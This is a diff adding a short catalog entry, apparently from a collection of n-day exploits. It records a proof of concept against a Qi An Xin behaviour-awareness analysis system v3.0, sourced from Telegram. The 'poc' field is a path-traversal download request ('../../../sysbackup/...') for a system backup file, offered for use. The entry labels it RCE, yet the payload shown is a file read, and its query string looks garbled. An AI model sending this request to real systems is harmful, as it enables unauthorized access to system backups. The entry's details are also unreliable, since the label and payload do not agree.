@@ -1,0 +1,7 @@
+vendor = "奇安信"
+name = "奇安信网神行为感知分析系统v3.0rce"
+type = "RCE"
+source = "TG"
+date = "08.15"
+poc = "/json/Util/download path=../../../sysbackup/自动备份 3.2.1 2021-12-01_03-00-02.backup3schema=http&type-email"
+label = "nday"
